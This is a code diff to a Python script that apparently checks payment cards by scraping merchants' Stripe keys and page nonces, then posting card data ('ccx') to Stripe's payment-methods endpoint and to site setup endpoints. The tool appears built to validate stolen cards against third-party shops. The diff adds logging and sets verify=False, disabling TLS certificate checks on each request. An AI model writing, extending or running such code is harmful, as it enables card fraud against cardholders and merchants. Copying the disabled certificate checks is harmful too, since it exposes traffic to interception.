@@ -986,6 +986,9 @@ def get_stripe_key(domain):
         except Exception as e:
             logger.error(f"Error getting Stripe key from {url}: {e}")
             continue
+    
+    logger.debug(f"No Stripe key found for {domain}, returning None")
+    return None
 
 def create_http_session():
     """Create a new HTTP session with all features"""
@@ -1070,19 +1073,25 @@ def process_card_enhanced(domain, ccx, use_registration=True):
     for url in payment_urls:
         try:
             logger.debug(f"Trying to get nonce from: {url}")
-            response = session.get(url, allow_redirects=True)
+            # Use the actual requests session inside HTTPSessionManager
+            response = session.session.get(url, timeout=10, allow_redirects=True, verify=False)
+            logger.debug(f"Response status: {response.status_code}, content length: {len(response.text)}")
             if response.status_code == 200:
                 html_content = response.text
                 nonce = extract_nonce_from_page(html_content, domain)
                 if nonce:
-                    logger.debug(f"Successfully extracted nonce from {url}")
+                    logger.debug(f"Successfully extracted nonce from {url}: {nonce[:30]}...")
                     break
+                else:
+                    logger.debug(f"No nonce found in response from {url}, trying next URL")
         except Exception as e:
-            logger.error(f"Error getting nonce from {url}: {e}")
+            logger.error(f"Error getting nonce from {url}: {e}", exc_info=True)
             continue
     
     if not nonce:
         logger.error(f"Failed to extract nonce from site. HTML length: {len(html_content) if html_content else 0}")
+        if html_content:
+            logger.debug(f"HTML preview: {html_content[:500]}")
         return {"Response": "Failed to extract nonce from site", "Status": "Declined"}
 
     payment_data = {
@@ -1108,11 +1117,12 @@ def process_card_enhanced(domain, ccx, use_registration=True):
 
     try:
         logger.debug("Creating payment method")
-        pm_response = session.post(
+        pm_response = session.session.post(
             'https://api.stripe.com/v1/payment_methods',
             data=payment_data,
             headers=fingerprint.get_stripe_headers(),
-            timeout=15
+            timeout=15,
+            verify=False
         )
         pm_data = pm_response.json()
 
@@ -1152,7 +1162,7 @@ def process_card_enhanced(domain, ccx, use_registration=True):
                 data_payload['action'] = payload_template.get('action')
                 
                 logger.debug(f"Trying endpoint: {endpoint['url']} with payload: {data_payload}")
-                setup_response = session.post(
+                setup_response = session.session.post(
                     endpoint['url'],
                     params=endpoint.get('params', {}),
                     headers={
@@ -1163,7 +1173,8 @@ def process_card_enhanced(domain, ccx, use_registration=True):
                         'x-requested-with': 'XMLHttpRequest',
                     },
                     data=data_payload,
-                    timeout=15
+                    timeout=15,
+                    verify=False
                 )
                 
                 try:
